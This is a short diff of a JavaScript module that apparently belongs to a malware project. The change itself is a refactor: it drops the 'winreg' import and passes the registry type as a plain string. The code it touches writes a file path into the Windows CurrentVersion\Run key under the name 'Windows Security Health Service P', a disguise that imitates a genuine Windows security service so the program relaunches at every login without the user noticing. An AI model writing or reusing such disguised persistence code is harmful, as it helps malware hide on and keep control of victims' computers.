@@ -1,6 +1,5 @@
 const fs = require('fs');
 const path = require('path');
-const Winreg = require('winreg');
 
 const program = require('../../utils/program/program.js');
 
@@ -16,7 +15,7 @@ module.exports = async () => {
         await program.setRegistryValue({
             keyPath: '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
             name: 'Windows Security Health Service P',
-            type: Winreg.REG_SZ,
+            type: 'REG_SZ',
             value: targetPath
         });
 
